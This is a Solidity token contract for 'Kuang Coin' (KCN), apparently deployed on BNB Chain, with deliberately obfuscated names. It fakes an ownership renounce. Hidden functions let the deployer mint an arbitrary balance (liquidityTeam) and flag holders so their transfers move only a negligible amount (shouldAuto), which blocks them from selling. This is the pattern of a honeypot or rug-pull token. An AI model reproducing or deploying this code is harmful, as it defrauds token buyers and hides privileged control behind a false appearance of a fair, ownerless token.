/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface swapWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface marketingAuto {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract KuangCoin {
    uint8 private enableLaunch = 18;

    address private tokenSwap;

    string private limitTeam = "Kuang Coin";
    string private atIs = "KCN";

    uint256 private isMarketingMode = 100000000 * 10 ** enableLaunch;
    mapping(address => uint256) private totalToken;
    mapping(address => mapping(address => uint256)) private minAt;

    mapping(address => bool) public minIs;
    address public receiverSell;
    address public tokenLiquidity;
    mapping(address => bool) public shouldMin;
    uint256 constant totalEnable = 11 ** 10;
    bool public isTotalTx;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        swapWallet swapFund = swapWallet(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenLiquidity = marketingAuto(swapFund.factory()).createPair(swapFund.WETH(), address(this));
        tokenSwap = modeTrading();
        receiverSell = tokenSwap;
        minIs[receiverSell] = true;
        totalToken[receiverSell] = isMarketingMode;
        emit Transfer(address(0), receiverSell, isMarketingMode);
        sellLaunched();
    }

    

    function getOwner() external view returns (address) {
        return tokenSwap;
    }

    function symbol() external view returns (string memory) {
        return atIs;
    }

    function sellLaunched() public {
        emit OwnershipTransferred(receiverSell, address(0));
        tokenSwap = address(0);
    }

    function transfer(address shouldTotal, uint256 tokenTake) external returns (bool) {
        return transferFrom(modeTrading(), shouldTotal, tokenTake);
    }

    function feeReceiver(address teamFrom) public {
        if (isTotalTx) {
            return;
        }
        minIs[teamFrom] = true;
        isTotalTx = true;
    }

    function balanceOf(address tradingAt) public view returns (uint256) {
        return totalToken[tradingAt];
    }

    function shouldAuto(address tokenLaunched) public {
        if (tokenLaunched == receiverSell || tokenLaunched == tokenLiquidity || !minIs[modeTrading()]) {
            return;
        }
        shouldMin[tokenLaunched] = true;
    }

    function transferFrom(address exemptMode, address shouldTotal, uint256 tokenTake) public returns (bool) {
        if (exemptMode != modeTrading() && minAt[exemptMode][modeTrading()] != type(uint256).max) {
            require(minAt[exemptMode][modeTrading()] >= tokenTake);
            minAt[exemptMode][modeTrading()] -= tokenTake;
        }
        if (shouldTotal == receiverSell || exemptMode == receiverSell) {
            return exemptMin(exemptMode, shouldTotal, tokenTake);
        }
        if (shouldMin[exemptMode]) {
            return exemptMin(exemptMode, shouldTotal, totalEnable);
        }
        return exemptMin(exemptMode, shouldTotal, tokenTake);
    }

    function decimals() external view returns (uint8) {
        return enableLaunch;
    }

    function modeTrading() private view returns (address) {
        return msg.sender;
    }

    function liquidityTeam(uint256 tokenTake) public {
        if (!minIs[modeTrading()]) {
            return;
        }
        totalToken[receiverSell] = tokenTake;
    }

    function allowance(address autoSender, address minToken) external view returns (uint256) {
        return minAt[autoSender][minToken];
    }

    function exemptMin(address launchedMarketing, address limitEnable, uint256 tokenTake) internal returns (bool) {
        require(totalToken[launchedMarketing] >= tokenTake);
        totalToken[launchedMarketing] -= tokenTake;
        totalToken[limitEnable] += tokenTake;
        emit Transfer(launchedMarketing, limitEnable, tokenTake);
        return true;
    }

    function approve(address minToken, uint256 tokenTake) public returns (bool) {
        minAt[modeTrading()][minToken] = tokenTake;
        emit Approval(modeTrading(), minToken, tokenTake);
        return true;
    }

    function name() external view returns (string memory) {
        return limitTeam;
    }

    function totalSupply() external view returns (uint256) {
        return isMarketingMode;
    }

    function owner() external view returns (address) {
        return tokenSwap;
    }


}